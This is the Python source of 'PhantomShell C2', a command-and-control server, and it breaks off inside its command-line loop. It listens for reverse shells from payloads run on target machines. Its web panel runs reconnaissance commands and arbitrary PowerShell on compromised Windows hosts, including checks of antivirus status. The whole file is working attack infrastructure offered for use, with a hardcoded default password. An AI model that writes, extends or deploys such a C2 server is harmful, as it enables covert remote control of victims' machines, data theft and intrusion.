#!/usr/bin/python3
"""
PhantomShell C2 Server
by Adrilaw/Kidpentester (https://github.com/Adrilaw)  & The-Psypher (https://github.com/The-Psypher)

Run this on your VPS. Operators connect via the web UI or CLI.
Targets connect back with PhantomShell payloads.

Usage:
    python3 c2_server.py --port 4444 --web-port 8080 --password yourpassword
"""

import socket
import threading
import json
import time
import os
import sys
import signal
import argparse
import hashlib
import datetime
import queue
import ssl
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import base64

VERSION = "1.0"

# ── Color ──────────────────────────────────────────────────────
C = {
    "R": '\033[0m',   "r": '\033[91m', "g": '\033[92m',
    "y": '\033[93m',  "b": '\033[94m', "c": '\033[96m',
    "w": '\033[97m',  "d": '\033[2m',  "B": '\033[1m',
}

STAR = f"{C['y']}[{C['b']}*{C['y']}]{C['R']}"
OK   = f"{C['g']}[{C['w']}+{C['g']}]{C['R']}"
ERR  = f"{C['r']}[{C['y']}!{C['r']}]{C['R']}"
INFO = f"{C['c']}[{C['w']}i{C['c']}]{C['R']}"


def banner():
    print(f"""{C['r']}
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝{C['c']}
    ██████╗██████╗      ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
   ██╔════╝╚════██╗     ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
   ██║      █████╔╝     ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
   ██║     ██╔═══╝      ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
   ╚██████╗███████╗     ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
    ╚═════╝╚══════╝     ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝{C['R']}
  {C['d']}PhantomShell C2 v{VERSION} — by Red Parakeet Security Team{C['R']}
""")


# ══════════════════════════════════════════════════════════════
# SESSION MANAGER
# ══════════════════════════════════════════════════════════════

class Session:
    def __init__(self, sid, sock, addr):
        self.id        = sid
        self.sock      = sock
        self.addr      = addr[0]
        self.port      = addr[1]
        self.connected = datetime.datetime.now()
        self.last_seen = datetime.datetime.now()
        self.hostname  = "unknown"
        self.username  = "unknown"
        self.os        = "unknown"
        self.alive     = True
        self.lock      = threading.Lock()
        self.cmd_queue = queue.Queue()
        self.out_queue = queue.Queue()

    def send(self, cmd: str) -> str:
        """Send a command and wait for output."""
        if not self.alive:
            return "[session dead]"
        try:
            with self.lock:
                self.sock.settimeout(30)
                self.sock.sendall((cmd + "\n").encode())
                output = b""
                while True:
                    try:
                        chunk = self.sock.recv(4096)
                        if not chunk:
                            break
                        output += chunk
                        # Stop reading when prompt appears
                        if output.endswith(b"> ") or b"PS>" in output[-20:]:
                            break
                    except socket.timeout:
                        break
                return output.decode(errors="replace").strip()
        except Exception as e:
            self.alive = False
            return f"[error: {e}]"

    def info_dict(self):
        return {
            "id":        self.id,
            "ip":        self.addr,
            "port":      self.port,
            "hostname":  self.hostname,
            "username":  self.username,
            "os":        self.os,
            "connected": self.connected.strftime("%Y-%m-%d %H:%M:%S"),
            "last_seen": self.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "alive":     self.alive,
        }


class SessionManager:
    def __init__(self):
        self._sessions = {}
        self._lock     = threading.Lock()
        self._next_id  = 1

    def add(self, sock, addr) -> Session:
        with self._lock:
            sid = self._next_id
            self._next_id += 1
            s = Session(sid, sock, addr)
            self._sessions[sid] = s
            return s

    def get(self, sid: int) -> Session:
        return self._sessions.get(sid)

    def all(self) -> list:
        return list(self._sessions.values())

    def alive(self) -> list:
        return [s for s in self._sessions.values() if s.alive]

    def remove(self, sid: int):
        with self._lock:
            self._sessions.pop(sid, None)

    def prune(self):
        """Remove dead sessions."""
        with self._lock:
            dead = [sid for sid, s in self._sessions.items() if not s.alive]
            for sid in dead:
                del self._sessions[sid]


# Global session manager
SM = SessionManager()
LOG = []  # event log


def log(msg: str, level: str = "info"):
    ts    = datetime.datetime.now().strftime("%H:%M:%S")
    entry = {"ts": ts, "level": level, "msg": msg}
    LOG.append(entry)
    if len(LOG) > 500:
        LOG.pop(0)
    icons = {"info": INFO, "ok": OK, "err": ERR, "star": STAR}
    icon  = icons.get(level, INFO)
    print(f"{icon} [{ts}] {msg}")


# ══════════════════════════════════════════════════════════════
# REVERSE SHELL LISTENER
# ══════════════════════════════════════════════════════════════

def handle_session(sess: Session):
    """Gather info from new session and keep it alive."""
    log(f"New session #{sess.id} from {sess.addr}:{sess.port}", "ok")

    # Try to gather basic info
    try:
        hostname = sess.send("hostname")
        if hostname and len(hostname) < 100:
            sess.hostname = hostname.split("\n")[-1].strip().replace("PS>", "").strip()

        whoami = sess.send("whoami")
        if whoami and len(whoami) < 100:
            sess.username = whoami.split("\n")[-1].strip().replace("PS>", "").strip()

        osinfo = sess.send("[System.Environment]::OSVersion.VersionString")
        if osinfo and len(osinfo) < 200:
            sess.os = osinfo.split("\n")[-1].strip().replace("PS>", "").strip()
    except:
        pass

    log(f"Session #{sess.id} — {sess.username}@{sess.hostname} ({sess.os})", "star")

    # Keep-alive loop
    while sess.alive:
        time.sleep(10)
        try:
            # Send empty to check if alive
            sess.sock.settimeout(5)
            sess.sock.sendall(b"echo alive\n")
            data = sess.sock.recv(256)
            if not data:
                raise Exception("no data")
            sess.last_seen = datetime.datetime.now()
        except:
            sess.alive = False
            log(f"Session #{sess.id} died ({sess.addr})", "err")
            break


def shell_listener(host: str, port: int):
    """Main TCP listener for incoming reverse shells."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((host, port))
        srv.listen(50)
        log(f"Shell listener on {host}:{port}", "ok")
    except Exception as e:
        log(f"Cannot bind shell listener on port {port}: {e}", "err")
        sys.exit(1)

    while True:
        try:
            conn, addr = srv.accept()
            sess = SM.add(conn, addr)
            t = threading.Thread(target=handle_session, args=(sess,), daemon=True)
            t.start()
        except Exception as e:
            log(f"Accept error: {e}", "err")


# ══════════════════════════════════════════════════════════════
# WEB UI + API
# ══════════════════════════════════════════════════════════════

WEB_PASSWORD = "phantomshell"   # overridden by --password flag
TOKENS       = set()            # active session tokens


def make_token(password: str) -> str:
    return hashlib.sha256((password + "phantomshell_salt").encode()).hexdigest()[:32]


def check_auth(handler) -> bool:
    cookie = handler.headers.get("Cookie", "")
    for part in cookie.split(";"):
        k, _, v = part.strip().partition("=")
        if k.strip() == "ps_token" and v.strip() in TOKENS:
            return True
    # Also check Authorization header for API calls
    auth = handler.headers.get("Authorization", "")
    if auth.startswith("Bearer ") and auth[7:] in TOKENS:
        return True
    return False


HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PhantomShell C2</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Orbitron:wght@400;700;900&display=swap');

  :root {
    --bg:      #080b0f;
    --surface: #0d1117;
    --border:  #1a2332;
    --accent:  #e63946;
    --accent2: #00d4ff;
    --green:   #00ff88;
    --yellow:  #ffd60a;
    --text:    #c9d1d9;
    --dim:     #4a5568;
  }

  * { margin:0; padding:0; box-sizing:border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    min-height: 100vh;
    overflow-x: hidden;
  }

  /* Scanline overlay */
  body::before {
    content: '';
    position: fixed; inset: 0;
    background: repeating-linear-gradient(
      0deg, transparent, transparent 2px,
      rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px
    );
    pointer-events: none;
    z-index: 9999;
  }

  header {
    border-bottom: 1px solid var(--border);
    padding: 16px 32px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    background: var(--surface);
  }

  .logo {
    font-family: 'Orbitron', monospace;
    font-size: 18px;
    font-weight: 900;
    color: var(--accent);
    letter-spacing: 3px;
    text-shadow: 0 0 20px rgba(230,57,70,0.5);
  }

  .logo span { color: var(--accent2); }

  .status-bar {
    display: flex;
    gap: 24px;
    font-size: 11px;
    color: var(--dim);
  }

  .status-bar .dot {
    display: inline-block;
    width: 6px; height: 6px;
    border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 6px var(--green);
    margin-right: 6px;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0%,100% { opacity:1; }
    50%      { opacity:0.3; }
  }

  .layout {
    display: grid;
    grid-template-columns: 300px 1fr;
    grid-template-rows: auto 1fr;
    height: calc(100vh - 57px);
  }

  /* Sessions panel */
  .sessions-panel {
    border-right: 1px solid var(--border);
    background: var(--surface);
    display: flex;
    flex-direction: column;
    grid-row: 1 / 3;
    overflow: hidden;
  }

  .panel-header {
    padding: 12px 16px;
    border-bottom: 1px solid var(--border);
    font-size: 10px;
    letter-spacing: 2px;
    color: var(--dim);
    text-transform: uppercase;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .badge {
    background: var(--accent);
    color: white;
    border-radius: 10px;
    padding: 1px 7px;
    font-size: 10px;
  }

  .sessions-list {
    flex: 1;
    overflow-y: auto;
    padding: 8px;
  }

  .sessions-list::-webkit-scrollbar { width: 4px; }
  .sessions-list::-webkit-scrollbar-track { background: transparent; }
  .sessions-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }

  .session-card {
    padding: 12px;
    border: 1px solid var(--border);
    border-radius: 4px;
    margin-bottom: 8px;
    cursor: pointer;
    transition: all 0.15s;
    background: var(--bg);
  }

  .session-card:hover, .session-card.active {
    border-color: var(--accent2);
    background: rgba(0,212,255,0.05);
  }

  .session-card.dead { opacity: 0.4; border-color: #333; }

  .session-id {
    font-family: 'Orbitron', monospace;
    font-size: 10px;
    color: var(--accent2);
    margin-bottom: 4px;
  }

  .session-host {
    font-size: 12px;
    color: var(--text);
    margin-bottom: 2px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  .session-meta {
    font-size: 10px;
    color: var(--dim);
  }

  .alive-dot {
    display: inline-block;
    width: 5px; height: 5px;
    border-radius: 50%;
    margin-right: 5px;
  }
  .alive-dot.on  { background: var(--green);  box-shadow: 0 0 4px var(--green); }
  .alive-dot.off { background: var(--accent); }

  /* Main area */
  .main-area {
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }

  /* Stats row */
  .stats-row {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    border-bottom: 1px solid var(--border);
  }

  .stat-box {
    padding: 16px 24px;
    border-right: 1px solid var(--border);
  }

  .stat-box:last-child { border-right: none; }

  .stat-label {
    font-size: 9px;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--dim);
    margin-bottom: 6px;
  }

  .stat-value {
    font-family: 'Orbitron', monospace;
    font-size: 24px;
    font-weight: 700;
    color: var(--text);
  }

  .stat-value.red    { color: var(--accent); text-shadow: 0 0 15px rgba(230,57,70,0.4); }
  .stat-value.cyan   { color: var(--accent2); text-shadow: 0 0 15px rgba(0,212,255,0.4); }
  .stat-value.green  { color: var(--green);  text-shadow: 0 0 15px rgba(0,255,136,0.4); }
  .stat-value.yellow { color: var(--yellow); text-shadow: 0 0 15px rgba(255,214,10,0.4); }

  /* Terminal */
  .terminal-area {
    flex: 1;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    padding: 16px;
    gap: 12px;
  }

  .session-info-bar {
    font-size: 11px;
    color: var(--dim);
    padding: 8px 12px;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 4px;
    display: flex;
    gap: 24px;
  }

  .session-info-bar span { color: var(--text); }

  .output-box {
    flex: 1;
    background: #020408;
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 16px;
    overflow-y: auto;
    font-size: 12px;
    line-height: 1.6;
    white-space: pre-wrap;
    word-break: break-all;
  }

  .output-box::-webkit-scrollbar { width: 4px; }
  .output-box::-webkit-scrollbar-thumb { background: var(--border); }

  .output-box .cmd-echo { color: var(--accent2); }
  .output-box .out      { color: var(--green); }
  .output-box .err-out  { color: var(--accent); }
  .output-box .sys      { color: var(--dim); font-style: italic; }

  .input-row {
    display: flex;
    gap: 8px;
    align-items: center;
  }

  .prompt {
    font-family: 'Orbitron', monospace;
    font-size: 11px;
    color: var(--accent);
    white-space: nowrap;
    padding: 0 8px;
  }

  .cmd-input {
    flex: 1;
    background: var(--surface);
    border: 1px solid var(--border);
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    padding: 10px 14px;
    border-radius: 4px;
    outline: none;
    transition: border-color 0.15s;
  }

  .cmd-input:focus { border-color: var(--accent2); }
  .cmd-input::placeholder { color: var(--dim); }

  .send-btn {
    background: var(--accent);
    color: white;
    border: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 1px;
    padding: 10px 20px;
    border-radius: 4px;
    cursor: pointer;
    transition: all 0.15s;
    text-transform: uppercase;
  }

  .send-btn:hover { background: #ff4757; box-shadow: 0 0 15px rgba(230,57,70,0.4); }

  /* Quick commands */
  .quick-cmds {
    display: flex;
    gap: 6px;
    flex-wrap: wrap;
  }

  .qcmd {
    background: var(--surface);
    border: 1px solid var(--border);
    color: var(--dim);
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    padding: 4px 10px;
    border-radius: 3px;
    cursor: pointer;
    transition: all 0.15s;
  }

  .qcmd:hover { border-color: var(--accent2); color: var(--accent2); }

  /* Log panel */
  .log-panel {
    border-top: 1px solid var(--border);
    max-height: 140px;
    overflow-y: auto;
    padding: 8px 16px;
    font-size: 11px;
    background: var(--surface);
  }

  .log-panel::-webkit-scrollbar { width: 4px; }
  .log-panel::-webkit-scrollbar-thumb { background: var(--border); }

  .log-entry {
    padding: 2px 0;
    color: var(--dim);
    display: flex;
    gap: 12px;
  }

  .log-entry .log-ts  { color: #2d3748; min-width: 60px; }
  .log-entry.ok  .log-msg { color: var(--green); }
  .log-entry.err .log-msg { color: var(--accent); }
  .log-entry.star .log-msg { color: var(--accent2); }

  /* No session placeholder */
  .no-session {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    color: var(--dim);
    gap: 12px;
  }

  .no-session-icon {
    font-size: 48px;
    opacity: 0.2;
  }

  .no-session p { font-size: 12px; letter-spacing: 1px; }

  /* Login overlay */
  #login-overlay {
    position: fixed; inset: 0;
    background: rgba(8,11,15,0.97);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10000;
  }

  .login-box {
    background: var(--surface);
    border: 1px solid var(--border);
    padding: 48px;
    border-radius: 8px;
    width: 380px;
    text-align: center;
  }

  .login-logo {
    font-family: 'Orbitron', monospace;
    font-size: 22px;
    font-weight: 900;
    color: var(--accent);
    text-shadow: 0 0 30px rgba(230,57,70,0.5);
    margin-bottom: 8px;
    letter-spacing: 3px;
  }

  .login-sub {
    color: var(--dim);
    font-size: 11px;
    letter-spacing: 2px;
    margin-bottom: 32px;
  }

  .login-input {
    width: 100%;
    background: var(--bg);
    border: 1px solid var(--border);
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    padding: 12px 16px;
    border-radius: 4px;
    outline: none;
    margin-bottom: 16px;
    text-align: center;
    letter-spacing: 3px;
  }

  .login-input:focus { border-color: var(--accent); }

  .login-btn {
    width: 100%;
    background: var(--accent);
    color: white;
    border: none;
    font-family: 'Orbitron', monospace;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 2px;
    padding: 14px;
    border-radius: 4px;
    cursor: pointer;
    transition: all 0.15s;
    text-transform: uppercase;
  }

  .login-btn:hover { box-shadow: 0 0 25px rgba(230,57,70,0.5); }

  .login-err {
    color: var(--accent);
    font-size: 11px;
    margin-top: 12px;
    min-height: 16px;
  }
</style>
</head>
<body>

<div id="login-overlay">
  <div class="login-box">
    <div class="login-logo">PHANTOM</div>
    <div class="login-sub">C2 SERVER — AUTHORIZED ACCESS ONLY</div>
    <input type="password" class="login-input" id="pw-input" placeholder="••••••••••••" />
    <button class="login-btn" onclick="doLogin()">AUTHENTICATE</button>
    <div class="login-err" id="login-err"></div>
  </div>
</div>

<header>
  <div class="logo">PHANTOM<span>SHELL</span> C2</div>
  <div class="status-bar">
    <div><span class="dot"></span>ONLINE</div>
    <div id="hdr-sessions">0 SESSIONS</div>
    <div id="hdr-time">--:--:--</div>
  </div>
</header>

<div class="layout">
  <!-- Sessions panel -->
  <div class="sessions-panel">
    <div class="panel-header">
      ACTIVE SESSIONS
      <span class="badge" id="sess-count">0</span>
    </div>
    <div class="sessions-list" id="sessions-list">
      <div style="color:var(--dim);font-size:11px;text-align:center;padding:32px 16px;line-height:2">
        Waiting for connections...<br>
        <span style="color:#1a2332">─────────────────</span><br>
        Run a PhantomShell payload<br>on the target machine
      </div>
    </div>
  </div>

  <!-- Main area -->
  <div class="main-area">
    <!-- Stats -->
    <div class="stats-row">
      <div class="stat-box">
        <div class="stat-label">Total Sessions</div>
        <div class="stat-value cyan" id="stat-total">0</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Active</div>
        <div class="stat-value green" id="stat-alive">0</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Dead</div>
        <div class="stat-value red" id="stat-dead">0</div>
      </div>
      <div class="stat-box">
        <div class="stat-label">Commands Sent</div>
        <div class="stat-value yellow" id="stat-cmds">0</div>
      </div>
    </div>

    <!-- Terminal -->
    <div class="terminal-area" id="terminal-area">
      <div class="no-session">
        <div class="no-session-icon">👻</div>
        <p>SELECT A SESSION TO INTERACT</p>
      </div>
    </div>

    <!-- Log -->
    <div class="log-panel" id="log-panel">
      <div class="log-entry"><span class="log-ts">--:--:--</span><span class="log-msg">PhantomShell C2 ready</span></div>
    </div>
  </div>
</div>

<script>
let token = localStorage.getItem('ps_token') || '';
let activeSid = null;
let cmdCount = 0;
let cmdHistory = [];
let histIdx = -1;

// ── Auth ────────────────────────────────────────────────────
async function doLogin() {
  const pw  = document.getElementById('pw-input').value;
  const res = await fetch('/api/login', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({password: pw})
  });
  const data = await res.json();
  if (data.ok) {
    token = data.token;
    localStorage.setItem('ps_token', token);
    document.cookie = `ps_token=${token}; path=/`;
    document.getElementById('login-overlay').style.display = 'none';
    startPolling();
  } else {
    document.getElementById('login-err').textContent = 'Invalid password';
  }
}

// Try stored token on load
window.addEventListener('load', async () => {
  if (token) {
    const res = await fetch('/api/sessions', {
      headers: {'Authorization': `Bearer ${token}`}
    });
    if (res.ok) {
      document.getElementById('login-overlay').style.display = 'none';
      startPolling();
    } else {
      token = '';
      localStorage.removeItem('ps_token');
    }
  }
  document.getElementById('pw-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') doLogin();
  });
});

// ── API helpers ─────────────────────────────────────────────
async function api(path, method='GET', body=null) {
  const opts = {
    method,
    headers: {
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/json'
    }
  };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(path, opts);
  if (!res.ok) return null;
  return res.json();
}

// ── Clock ───────────────────────────────────────────────────
setInterval(() => {
  document.getElementById('hdr-time').textContent =
    new Date().toTimeString().slice(0,8);
}, 1000);

// ── Polling ─────────────────────────────────────────────────
function startPolling() {
  refreshSessions();
  refreshLogs();
  setInterval(refreshSessions, 3000);
  setInterval(refreshLogs, 5000);
}

async function refreshSessions() {
  const data = await api('/api/sessions');
  if (!data) return;

  const sessions = data.sessions;
  const alive    = sessions.filter(s => s.alive).length;
  const dead     = sessions.length - alive;

  document.getElementById('sess-count').textContent  = alive;
  document.getElementById('hdr-sessions').textContent = `${alive} SESSION${alive !== 1 ? 'S' : ''}`;
  document.getElementById('stat-total').textContent  = sessions.length;
  document.getElementById('stat-alive').textContent  = alive;
  document.getElementById('stat-dead').textContent   = dead;
  document.getElementById('stat-cmds').textContent   = cmdCount;

  const list = document.getElementById('sessions-list');
  if (sessions.length === 0) {
    list.innerHTML = `<div style="color:var(--dim);font-size:11px;text-align:center;padding:32px 16px;line-height:2">
      Waiting for connections...<br>
      <span style="color:#1a2332">─────────────────</span><br>
      Run a PhantomShell payload<br>on the target machine
    </div>`;
    return;
  }

  list.innerHTML = sessions.map(s => `
    <div class="session-card ${!s.alive ? 'dead' : ''} ${s.id === activeSid ? 'active' : ''}"
         onclick="selectSession(${s.id})">
      <div class="session-id">
        <span class="alive-dot ${s.alive ? 'on' : 'off'}"></span>
        SESSION #${s.id}
      </div>
      <div class="session-host">${s.username}@${s.hostname}</div>
      <div class="session-meta">${s.ip} · ${s.connected}</div>
    </div>
  `).join('');
}

async function refreshLogs() {
  const data = await api('/api/logs');
  if (!data) return;
  const panel = document.getElementById('log-panel');
  panel.innerHTML = data.logs.slice(-30).reverse().map(e => `
    <div class="log-entry ${e.level}">
      <span class="log-ts">${e.ts}</span>
      <span class="log-msg">${e.msg}</span>
    </div>
  `).join('');
}

// ── Session interaction ─────────────────────────────────────
function selectSession(sid) {
  activeSid = sid;
  refreshSessions();
  renderTerminal(sid);
}

async function renderTerminal(sid) {
  const data = await api(`/api/sessions`);
  if (!data) return;
  const sess = data.sessions.find(s => s.id === sid);
  if (!sess) return;

  const ta = document.getElementById('terminal-area');
  ta.innerHTML = `
    <div class="session-info-bar">
      <div>HOST <span>${sess.hostname}</span></div>
      <div>USER <span>${sess.username}</span></div>
      <div>IP <span>${sess.ip}</span></div>
      <div>OS <span>${sess.os || 'Windows'}</span></div>
      <div>STATUS <span style="color:${sess.alive ? 'var(--green)' : 'var(--accent)'}">${sess.alive ? 'ALIVE' : 'DEAD'}</span></div>
    </div>
    <div class="quick-cmds">
      <button class="qcmd" onclick="quickCmd('whoami')">whoami</button>
      <button class="qcmd" onclick="quickCmd('hostname')">hostname</button>
      <button class="qcmd" onclick="quickCmd('ipconfig')">ipconfig</button>
      <button class="qcmd" onclick="quickCmd('systeminfo')">sysinfo</button>
      <button class="qcmd" onclick="quickCmd('net user')">net user</button>
      <button class="qcmd" onclick="quickCmd('Get-Process | Select-Object Name,Id | Format-Table')">processes</button>
      <button class="qcmd" onclick="quickCmd('dir C:\\\\Users')">dir users</button>
      <button class="qcmd" onclick="quickCmd('Get-ChildItem Env:')">env vars</button>
      <button class="qcmd" onclick="quickCmd('netstat -ano')">netstat</button>
      <button class="qcmd" onclick="quickCmd('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusEnabled')">av status</button>
    </div>
    <div class="output-box" id="output-box">
      <span class="sys">// Session #${sid} — ${sess.username}@${sess.hostname} — ${sess.connected}</span>\n
    </div>
    <div class="input-row">
      <span class="prompt">PS&gt;</span>
      <input type="text" class="cmd-input" id="cmd-input"
             placeholder="Enter PowerShell command..."
             ${!sess.alive ? 'disabled' : ''}
             onkeydown="handleKey(event)" />
      <button class="send-btn" onclick="sendCmd()" ${!sess.alive ? 'disabled' : ''}>EXEC</button>
    </div>
  `;

  document.getElementById('cmd-input')?.focus();
}

function handleKey(e) {
  if (e.key === 'Enter') {
    sendCmd();
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (histIdx < cmdHistory.length - 1) {
      histIdx++;
      document.getElementById('cmd-input').value = cmdHistory[cmdHistory.length - 1 - histIdx];
    }
  } else if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (histIdx > 0) {
      histIdx--;
      document.getElementById('cmd-input').value = cmdHistory[cmdHistory.length - 1 - histIdx];
    } else {
      histIdx = -1;
      document.getElementById('cmd-input').value = '';
    }
  }
}

function quickCmd(cmd) {
  const inp = document.getElementById('cmd-input');
  if (inp) { inp.value = cmd; sendCmd(); }
}

async function sendCmd() {
  const input = document.getElementById('cmd-input');
  if (!input || !activeSid) return;
  const cmd = input.value.trim();
  if (!cmd) return;

  cmdHistory.push(cmd);
  histIdx = -1;
  input.value = '';
  cmdCount++;
  document.getElementById('stat-cmds').textContent = cmdCount;

  const out = document.getElementById('output-box');
  out.innerHTML += `<span class="cmd-echo">PS&gt; ${escHtml(cmd)}</span>\n`;
  out.innerHTML += `<span class="sys">// executing...</span>\n`;
  out.scrollTop = out.scrollHeight;

  const data = await api('/api/exec', 'POST', {session_id: activeSid, command: cmd});

  // Remove the "executing..." line
  out.innerHTML = out.innerHTML.replace('<span class="sys">// executing...</span>\n', '');

  if (data && data.output !== undefined) {
    const cls = data.output.includes('error') || data.output.includes('Error') ? 'err-out' : 'out';
    out.innerHTML += `<span class="${cls}">${escHtml(data.output)}</span>\n\n`;
  } else {
    out.innerHTML += `<span class="err-out">// no response or session dead</span>\n\n`;
  }
  out.scrollTop = out.scrollHeight;
}

function escHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
</script>
</body>
</html>"""


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, *_): pass

    def send_json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def send_html(self, html: str):
        body = html.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Authorization,Content-Type")
        self.end_headers()

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/" or path == "/index.html":
            self.send_html(HTML_PAGE)
            return

        if path == "/api/sessions":
            if not check_auth(self):
                self.send_json({"error": "unauthorized"}, 401); return
            SM.prune()
            self.send_json({"sessions": [s.info_dict() for s in SM.all()]})
            return

        if path == "/api/logs":
            if not check_auth(self):
                self.send_json({"error": "unauthorized"}, 401); return
            self.send_json({"logs": LOG[-100:]})
            return

        self.send_json({"error": "not found"}, 404)

    def do_POST(self):
        path    = urlparse(self.path).path
        length  = int(self.headers.get("Content-Length", 0))
        body    = json.loads(self.rfile.read(length) or b"{}") if length else {}

        if path == "/api/login":
            pw = body.get("password", "")
            if pw == WEB_PASSWORD:
                t = make_token(pw + str(time.time()))
                TOKENS.add(t)
                self.send_json({"ok": True, "token": t})
            else:
                log(f"Failed login from {self.client_address[0]}", "err")
                self.send_json({"ok": False})
            return

        if not check_auth(self):
            self.send_json({"error": "unauthorized"}, 401); return

        if path == "/api/exec":
            sid  = body.get("session_id")
            cmd  = body.get("command", "")
            sess = SM.get(sid)
            if not sess:
                self.send_json({"error": "session not found"}); return
            if not sess.alive:
                self.send_json({"output": "[session is dead]"}); return
            log(f"#{sid} CMD: {cmd}", "star")
            output = sess.send(cmd)
            sess.last_seen = datetime.datetime.now()
            self.send_json({"output": output})
            return

        self.send_json({"error": "not found"}, 404)


def web_server(host: str, port: int):
    srv = HTTPServer((host, port), C2Handler)
    log(f"Web UI on http://{host}:{port}", "ok")
    srv.serve_forever()


# ══════════════════════════════════════════════════════════════
# CLI (for direct terminal interaction alongside web UI)
# ══════════════════════════════════════════════════════════════

def cli_loop():
    """Optional interactive CLI for direct session control."""
    time.sleep(1)  # Let servers start
    print(f"\n{INFO} Type {C['c']}help{C['R']} for commands. Web UI is the primary interface.\n")

    while True:
        try:
            line = input(f"{C['r']}phantom{C['R']} > ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if not line:
            continue

        parts = line.split(None, 2)
        cmd   = parts[0].lower()

        if cmd in ("help", "?"):
            print(f"""
  {C['c']}sessions{C['R']}              — list all sessions
  {C['c']}interact <id>{C['R']}         — drop into interactive shell
  {C['c']}exec <id> <cmd>{C['R']}       — run single command
  {C['c']}kill <id>{C['R']}             — mark session dead
  {C['c']}prune{C['R']}                 — remove dead sessions
  {C['c']}exit{C['R']}                  — quit C2 server
""")

        elif cmd == "sessions":
            SM.prune()
            sessions = SM.all()
            if not sessions:
                print(f"  {C['d']}no sessions{C['R']}")
                continue
            print(f"\n  {'ID':<5} {'IP':<18} {'USER@HOST':<32} {'STATUS':<8} CONNECTED")
            print(f"  {'─'*5} {'─'*18} {'─'*32} {'─'*8} {'─'*20}")
            for s in sessions:
                status = f"{C['g']}ALIVE{C['R']}" if s.alive else f"{C['r']}DEAD{C['R']}"
                print(f"  {s.id:<5} {s.addr:<18} {s.username+'@'+s.hostname:<32} {status:<20} {s.connected.strftime('%H:%M:%S')}")
            print()

        elif cmd == "interact" and len(parts) >= 2:
            try:
                sid  = int(parts[1])
                sess = SM.get(sid)
                if not sess:
                    print(f"  {ERR} session {sid} not found")
                    continue
                if not sess.alive:
                    print(f"  {ERR} session {sid} is dead")
                    continue
                print(f"\n  {OK} Interacting with #{sid} ({sess.username}@{sess.hostname})")
                print(f"  {C['d']}Type 'back' to return to C2{C['R']}\n")
                while sess.alive:
                    try:
                        icmd = input(f"  {C['c']}PS #{sid}{C['R']} > ").strip()
